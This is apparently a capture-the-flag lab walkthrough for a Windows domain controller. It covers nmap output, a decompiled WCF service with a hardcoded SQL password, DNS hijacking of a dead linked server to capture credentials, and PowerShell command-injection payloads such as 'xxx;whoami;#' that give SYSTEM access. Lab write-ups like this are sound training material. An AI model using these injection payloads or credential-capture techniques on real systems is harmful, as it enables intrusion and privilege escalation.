# overwatch

```
# Nmap 7.99 scan initiated Thu May 14 02:04:08 2026 as: /usr/lib/nmap/nmap --privileged -n -sC -sV -p- -vv -oA overwatch 10.129.244.81
Nmap scan report for 10.129.244.81
Host is up, received echo-reply ttl 127 (0.068s latency).
Scanned at 2026-05-14 02:04:09 EDT for 230s
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-05-14 06:06:27Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2026-05-14T06:07:56+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Issuer: commonName=S200401.overwatch.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-13T05:59:50
| Not valid after:  2026-11-12T05:59:50
| MD5:     d458 de18 c98f 7079 d90f bf35 a86c 39b1
| SHA-1:   7056 3975 5ad8 633c 3339 1238 3f6a 92b0 ce6b d6e4
| SHA-256: baf5 85aa 5a23 c90d ec89 1dc1 07e5 d76f 0db3 8cdd f41a a8a0 8e1b 1ed5 f8a3 502b
| -----BEGIN CERTIFICATE-----
| MIIC7jCCAdagAwIBAgIQI7S0j5pKv7ZKI18WilaiszANBgkqhkiG9w0BAQsFADAg
| MR4wHAYDVQQDExVTMjAwNDAxLm92ZXJ3YXRjaC5odGIwHhcNMjYwNTEzMDU1OTUw
| WhcNMjYxMTEyMDU1OTUwWjAgMR4wHAYDVQQDExVTMjAwNDAxLm92ZXJ3YXRjaC5o
| dGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDM+PZU4C4KbdTdNOgl
| dsDhV2y2Wq9qNaFjplis/DfTTYY3FiizGwdqA9lpjNJmsqjPlFA4Okw+7V5G1hwm
| BgKRfjM51PWb4g3k2Qwz+nFWZwY/RFEbd2daG1krkBsw2TW2xo7Lfd5b0m7MrI1H
| AnZhb9DXr5H8eWSShFnIsUOQFgSsLuvm5NCVw0G7MnoSU9a97MBln/aLj5hGJOk/
| bIJENpanRG14LTR63ph8atMUZKxDbVt3tV8dMriEDZBGYfxnQdN/gHC+5nr7eRzy
| jRaY0fEfd8YRQTwYXxniNT+kAFkanvEe/2Ql7ByS6xnUx67XTmMl5Gu2c1kvYC+5
| g5pNAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDAN
| BgkqhkiG9w0BAQsFAAOCAQEAB19BVRtdIKMutpMbN6tjf1S5xEYOWN59pY2UAumn
| fRGBZmO+LbHXjyIs11RW51XKTVwd69ANk7VT5uW8V9Bs7JR3Qz0HOg/ERGqTOJ2m
| bOIgh8w5iJ8V4sOwotX6c3halcER2rhP+XFHP0tQU4sLD4+HuTj/ngeNCfv1HWXq
| zk8HTnBJUZyYTwVgtmqzssQgFywMhpZP/V7UGRyUc9mN6/sdKHp3dg++NJekPV/n
| 4BticjCTNwOEdaDzwPrhk1kXnvbeAgQbmVGYEQSqzKKLj9gKQjP8PZd3HeRFiMmW
| dIu4Gs4newIItTah9rzStZx35LMxRWullMnm090VluwjBw==
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-14T06:07:17+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6520/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-14T06:02:04
| Not valid after:  2056-05-14T06:02:04
| MD5:     84c2 77ab c502 4775 cad1 0a8f b99f 82b0
| SHA-1:   2bb0 7152 ad1f 964d 3903 1149 b914 5f9c 73aa 69da
| SHA-256: f482 f754 380e 2f1e 05ab 3c1b 8772 cf49 441e 4f06 3ebb 189e 404b a1e1 aa4f f1c3
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQGzcP6aDZ07lM3PT29SNdHzANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjYwNTE0MDYwMjA0WhgPMjA1NjA1MTQwNjAyMDRaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAJ3xU9iN
| IkAaqX9xzJKnyTxOFQAjKrCLBRT2B4XvprFvyxLn8KRugCTdoR65wh402vcyx/iC
| RApgLBMq/1mFNjElgHGZuLbu8VhRK4mzzw5LqiUpSsqNCAD7bGBngcNLWeoxjlec
| BwhoOfXzEtNwIuKbet3y7Oq5BnA7Mu5dMHoplLBK1dujnG2kDu1KPTJUuGmWAcS5
| 9qbdZTLP7mRQAYUT9ms8gni/QoDgb1Lm73JSpJaO2+GoN//osBO3A4LF/p9k+8Fc
| /v6nTaYV44wImf4xH6KHJhCKExlx55t2fVydocewcLXTPM7/sNqrxcLYo3BqpLwb
| Rc5JhniyVlo6YublxwarTQVezjF4Z7Q8lV0fQsKP76rGAJuJuydQ589nGaMWSW/v
| IjY1q//RVctZ39gYoyscrVG3CKOXSGmquHSkdArPgjAUUaUuaMaFiqZ799sFBhsL
| 2g0aUZrJXAWorUfGO33E6OUYomqo2BPiLBWGTF9WSd+7Vnv+MeLixib0sQIDAQAB
| MA0GCSqGSIb3DQEBCwUAA4IBgQAv5YWS+LXi13UnwuOicEPHVze2QJACVJ6kJMGe
| bN7kK2GgUrc4o7ZF0CotQd2ZkIKH/OusFM1zzPTsnWs2AZRoYzmqzKF8l5Db/VWc
| sCoGmqcrnkkKkoaE5IbX6GSo6pfusOFqiu6EYDbBD9aj/ZPc/gKUYaspWeAwKfV6
| Y0mm7b1gFQV4tDCn5yO3sPL+lECXJQOc1xoVwBOkuJ0L5mMMJRtFplJxmZkCi/fi
| LO2AgPDmkubhw+0OElZiWhtHpKgw1O4cqVuWJLLgIT72cEyaTqUbO6i+CxCbTI8F
| F09KWXLFLkH9s9nSwLlHIjI4aPuIOD8vixHfGjXNvS2OdXVKRwAgZteTLbv9zwId
| Pm+oSqxiztEjAZU71NuEuoNa8cKbKanZDol8p1cOe5g6sMCgYERtURuzuSrtHRAs
| EV9RLMwr2ruuu4R98xWYYK0gZn6saWNWF1VgBtAbZOlG2lZL4STtaWOQ3rORuCsu
| f0XebH73Wnl/ZcsfxrS00AZiMdk=
|_-----END CERTIFICATE-----
| ms-sql-info: 
|   10.129.244.81:6520: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 6520
| ms-sql-ntlm-info: 
|   10.129.244.81:6520: 
|     Target_Name: OVERWATCH
|     NetBIOS_Domain_Name: OVERWATCH
|     NetBIOS_Computer_Name: S200401
|     DNS_Domain_Name: overwatch.htb
|     DNS_Computer_Name: S200401.overwatch.htb
|     DNS_Tree_Name: overwatch.htb
|_    Product_Version: 10.0.20348
|_ssl-date: 2026-05-14T06:07:56+00:00; 0s from scanner time.
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
51954/tcp open  tcpwrapped    syn-ack ttl 127
54692/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
54693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
54700/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
54717/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
63173/tcp open  tcpwrapped    syn-ack ttl 127
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2026-05-14T06:07:17
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25478/tcp): CLEAN (Timeout)
|   Check 2 (port 14084/tcp): CLEAN (Timeout)
|   Check 3 (port 53968/udp): CLEAN (Timeout)
|   Check 4 (port 37327/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 14 02:07:59 2026 -- 1 IP address (1 host up) scanned in 230.62 seconds
```

basically a domain controller with rdp. also mssql running on nonstandard port 6520

`nxc smb` tells us null auth is enabled, listing the shares we find one 'software' we can read

inside the share is a dotnet app, including a .exe, .exe.config, .pdb, grab all that shit

## investigating software

looking in the config it describes a MonitoringService with a base address of `http://overwatch.htb:8000/MonitorService`, and a couple endpoints that specify [WCF](https://learn.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf) contracts.

we can't access that port directly, but now we have something to target. The endpoint under IMonitoringService contract is a basic http binding, so it should be simple once we get to it

we can use [ILSpy](https://github.com/icsharpcode/ilspy) to disassemble the executable into c#

### decompilation

the code defines the interface for use with wcf:

```csharp
public interface IMonitoringService
{
        [OperationContract]
        string StartMonitoring();

        [OperationContract]
        string StopMonitoring();

        [OperationContract]
        string KillProcess(string processName);
}
```

and also has a hardcoded password for sql `SqlConnection val = new SqlConnection("Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;");`

there is also a command being built for powershell in the KillProcess method, with no sanitization. once we get to it we should probably try injecting into this

```csharp
public string KillProcess(string processName)
        {
                string text = "Stop-Process -Name " + processName + " -Force";
...
```

## attacking mssql

we discovered the nonstandard mssql port earlier by running scripts for every port (bad practice, i know). enumerating it with our new credentials will show us a linked server SQL07

we can't use_link on it (impacket), we get a "server not found or not accessible", and indeed if we run a scan with rusthound sql07 is nowhere to be seen, only SQL03

it seems like the link is just dead..

## ad enumeration

bloodyAD will show us we have CREATE_CHILD on the DomanDnsZones and ForestDnsZones. this can be leveraged to point SQL07 at ourselves and take over the dead link on the sql server.

let's try catching the link authentication with responder, we might get different credentials

```
[+] Listening for events...                                                                                                                              

[MSSQL] Cleartext Client   : 10.129.244.81
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

sqlmgmt certainly seems like good creds to have. they don't really get us anything new on mssql, but it turns out they do have winrm access. so thats nice.

---

## on the box

so now that we've finally gotten to the box we can attack the local service we found earlier at :8000

`curl -UseBasicParsing http://overwatch.htb/MonitorService?wsdl | Select -ExpandProperty RawContent`

will get us the wsdl (api description for wcf services) so we can try to attack it. we already know there is a KillProcess endpoint in there with a potential injection.

registering a client to a wcf service looks like this:

```powershell
$client = New-WebServiceProxy -Uri $uri -Namespace "WcfProxy"
```

now if we try injecting into KillProcess (remember it just took the processname as a string)

```powershell
$client.KillProcess("xxx;ping 10.10.15.201;#")
```

it works!! we also get the output. `"xxx;whoami;#"` will tell us we have injection as nt authority\system.

![pwn](/images/20260514_01h17m08s_grim.png)

now we can just `$client.KillProcess("xxx;type 'C:\Users\Administrator\Desktop\root.txt';#")` and get the flag, alternatively we could `net localgroup administrators sqlmgmt` and relog, or add a brand new user to administrators. whatever


